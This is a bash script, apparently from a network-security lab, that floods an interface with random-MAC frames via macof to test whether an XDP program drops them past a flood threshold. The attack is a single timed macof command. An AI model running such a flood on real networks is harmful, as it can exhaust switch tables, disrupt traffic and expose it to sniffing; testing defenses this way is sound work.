#!/bin/bash
# ═══════════════════════════════════════════════════════════════════════
# attack_mac_flood.sh — MAC Flooding Attack Simulation
#
# Run this on the ATTACKER VM to simulate a MAC flooding attack.
# Sends thousands of Ethernet frames with random source MACs to
# exhaust the switch's MAC table (CAM table).
#
# The XDP program's mac_tracking_map (LRU) + FLOOD_THRESHOLD
# should detect and drop these once the threshold is exceeded.
#
# Prerequisites:
#   sudo apt-get install dsniff
#
# Usage:
#   sudo ./attack_mac_flood.sh <interface> [duration_seconds]
#
# Example:
#   sudo ./attack_mac_flood.sh eth0 30
# ═══════════════════════════════════════════════════════════════════════

set -euo pipefail

IFACE="${1:-eth0}"
DURATION="${2:-30}"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[ERROR]${NC} Must run as root" && exit 1
fi

# Install macof if not present
if ! command -v macof &>/dev/null; then
    echo -e "${CYAN}[INFO]${NC} Installing dsniff (provides macof)..."
    apt-get update -qq && apt-get install -y -qq dsniff
fi

echo ""
echo -e "${YELLOW}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${YELLOW}║           MAC FLOODING ATTACK SIMULATION                   ║${NC}"
echo -e "${YELLOW}╠══════════════════════════════════════════════════════════════╣${NC}"
echo -e "${YELLOW}║  Interface: $IFACE${NC}"
echo -e "${YELLOW}║  Duration:  ${DURATION}s${NC}"
echo -e "${YELLOW}║                                                            ║${NC}"
echo -e "${YELLOW}║  macof will send thousands of frames with random MACs.     ║${NC}"
echo -e "${YELLOW}║  XDP should drop them once FLOOD_THRESHOLD is exceeded.    ║${NC}"
echo -e "${YELLOW}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""

echo -e "${RED}[ATTACK]${NC} Starting MAC flood on $IFACE for ${DURATION}s..."
echo -e "${CYAN}[INFO]${NC}  Monitor the switch stats with: ./monitor_stats.sh"
echo ""

# Run macof for the specified duration
timeout "$DURATION" macof -i "$IFACE" 2>&1 || true

echo ""
echo -e "${GREEN}[DONE]${NC} MAC flood attack completed after ${DURATION}s."
echo -e "${CYAN}[INFO]${NC}  Check XDP stats on the switch to see how many packets were dropped."
